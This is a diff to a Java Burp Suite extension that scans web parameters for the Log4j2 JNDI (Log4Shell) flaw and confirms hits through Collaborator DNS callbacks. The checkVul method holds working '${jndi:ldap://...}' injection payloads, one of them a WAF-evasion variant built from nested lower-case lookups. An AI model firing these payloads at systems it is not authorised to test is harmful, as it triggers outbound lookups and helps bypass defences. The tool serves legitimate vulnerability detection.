@@ -11,7 +11,7 @@ import javax.swing.*;
 import javax.swing.table.AbstractTableModel;
 import javax.swing.table.TableModel;
 
-public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IContextMenuFactory{
+public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IContextMenuFactory {
     public IBurpExtenderCallbacks callbacks;
     public IExtensionHelpers helpers;
     public PrintWriter stdout;
@@ -21,35 +21,34 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
     private Table logTable;
     private final List<LogEntry> log = new ArrayList<LogEntry>();
     private IHttpRequestResponse currentlyDisplayedItem;
+
     @Override
     public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
         this.callbacks = callbacks;
         this.stdout = new PrintWriter(callbacks.getStdout(), true);
         this.helpers = callbacks.getHelpers();
-        callbacks.setExtensionName("BurpLog4j2-Scan");
-
+        callbacks.setExtensionName("BurpLog4j2Scan");
+        stdout.println("@Author: TXF");
+        stdout.println("@Github: https://github.com/tangxiaofeng7/BurpLog4j2Scan");
         callbacks.registerScannerCheck(this);
         callbacks.registerContextMenuFactory(this);
-        SwingUtilities.invokeLater(new Runnable(){
+        SwingUtilities.invokeLater(new Runnable() {
             @Override
             public void run() {
                 splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                 logTable = new Table(BurpExtender.this);
                 JScrollPane scrollPane = new JScrollPane(logTable);
                 splitPane.setLeftComponent(scrollPane);
-
                 JTabbedPane tabs = new JTabbedPane();
                 requestViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                 responseViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                 tabs.addTab("Request", requestViewer.getComponent());
                 tabs.addTab("Response", responseViewer.getComponent());
                 splitPane.setRightComponent(tabs);
-
                 BurpExtender.this.callbacks.customizeUiComponent(splitPane);
                 BurpExtender.this.callbacks.customizeUiComponent(logTable);
                 BurpExtender.this.callbacks.customizeUiComponent(scrollPane);
                 BurpExtender.this.callbacks.customizeUiComponent(tabs);
-
                 BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
             }
         });
@@ -70,68 +69,61 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         return 0;
     }
 
-    public void checkVul(IHttpRequestResponse baseRequestResponse, int row){
-
+    public void checkVul(IHttpRequestResponse baseRequestResponse, int row) {
         List<String> payloads = new ArrayList<String>();
         URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
         List<IScanIssue> issues = new ArrayList<>();
         byte[] rawRequest = baseRequestResponse.getRequest();
         byte[] tmpRawRequest = rawRequest;
         IRequestInfo req = this.helpers.analyzeRequest(baseRequestResponse);
+        List<IParameter> paraList = req.getParameters();
+        int  vuln = 0;
         // 2.x-poc
         payloads.add("${jndi:ldap://%s}");
-        //rc1绕过
-        payloads.add("${jndi:ldap://%s /asd");
         //waf绕过
         payloads.add("${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://%s}");
         IBurpCollaboratorClientContext context = this.callbacks.createBurpCollaboratorClientContext();
         String dnslog = context.generatePayload(true);
-        for (IParameter param :
-                req.getParameters()) {
+        List<IBurpCollaboratorInteraction> dnsres = new ArrayList<>();
+        for (IParameter param : paraList) {
             try {
-                List<IBurpCollaboratorInteraction> dnsres = new ArrayList<>();
                 for (String payload : payloads) {
                     payload = String.format(payload, dnslog);
-                    this.stdout.println("本次检测的payload为"+payload);
+                    stdout.println("payload is " + payload);
+                    stdout.println("param key is " + param.getName());
+                    stdout.println("param value is " + param.getValue());
                     payload = this.helpers.urlEncode(payload);
-                    IParameter newParam = this.helpers.buildParameter(param.getName(), payload, param.getType());
-                    tmpRawRequest = this.helpers.updateParameter(rawRequest, newParam);
+                    IParameter newParam = helpers.buildParameter(param.getName(), payload, param.getType());
+                    tmpRawRequest = helpers.updateParameter(rawRequest, newParam);
                     {
-                        this.stdout.println("提醒您：我开始检测了");
                         boolean hasModify = true;
-                            if (hasModify){
-
-                                IHttpRequestResponse tmpReq = this.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
-                                tmpReq.getResponse();
-                                this.stdout.println("开始slepp");
-                                Thread.sleep(5000);
-                                this.stdout.println("slepp结束了，查看dnslog结果");
-                                dnsres = context.fetchCollaboratorInteractionsFor(dnslog);
-                                if (!dnsres.isEmpty()){
-                                    this.stdout.println("find vuln!!!" + req.getUrl());
-                                    // 漏洞存在就更新表格中存在漏洞那一行的数据
-                                    LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", tmpReq);
-                                    log.set(row, logEntry);
-                                    // 这个方法是swing中的一个方法，会通知表格更新指定行的数据
-                                    fireTableRowsUpdated(row, row);
-                                    break;
-                                }
+                        if (hasModify) {
+                            IHttpRequestResponse tmpReq = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
+                            tmpReq.getResponse();
+                            Thread.sleep(2000);
+                            dnsres = context.fetchCollaboratorInteractionsFor(dnslog);
+                            if (!dnsres.isEmpty()) {
+                                stdout.println("find vuln!!!" + req.getUrl());
+                                LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", tmpReq);
+                                log.set(row, logEntry);
+                                fireTableRowsUpdated(row, row);
+                                vuln=1;
+                                break;
                             }
+                        }
+                    }
                 }
-        }
-                if(dnsres.isEmpty()){
-                    LogEntry logEntry = new LogEntry(url, "finished", "not vul", baseRequestResponse);
-                    log.set(row, logEntry);
-                    fireTableRowsUpdated(row, row);
-                    break;
-                }
-            } catch (Exception e) {
+            } catch (InterruptedException e) {
                 e.printStackTrace();
             }
         }
-
+        if (vuln == 0){
+            LogEntry logEntry = new LogEntry(url, "finished", "not vul", baseRequestResponse);
+            log.set(row, logEntry);
+            fireTableRowsUpdated(row, row);
+        }
     }
-    // tab页的显示名称
+
     @Override
     public String getTabCaption() {
         return "Log4j2Scan";
@@ -202,7 +194,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
     public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
         List<JMenuItem> menus = new ArrayList<>(1);
         IHttpRequestResponse responses[] = invocation.getSelectedMessages();
-        JMenuItem menuItem = new JMenuItem("Send to Log4jScan");
+        JMenuItem menuItem = new JMenuItem("Send to Log4j2Scan");
         menus.add(menuItem);
         menuItem.addActionListener(new ActionListener() {
             @Override
@@ -212,7 +204,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 LogEntry logEntry = new LogEntry(helpers.analyzeRequest(responses[0]).getUrl(), "scanning", "", responses[0]);
                 log.add(logEntry);
                 fireTableRowsInserted(row, row);
-                // 在事件触发时是不能发送网络请求的，否则可能会造成整个burp阻塞崩溃，所以必须要新起一个线程来进行漏洞检测
+
                 Thread thread = new Thread(new Runnable() {
                     @Override
                     public void run() {
@@ -225,7 +217,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         return menus;
     }
 
-    // 用于描述一条请求记录的数据结构
+
     private static class LogEntry{
         final URL url;
         final String status;
@@ -240,7 +232,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         }
     }
 
-    // 自定义table的changeSelection方法，将request\response展示在正确的窗口中
+
     private class Table extends JTable
     {
         public Table(TableModel tableModel)
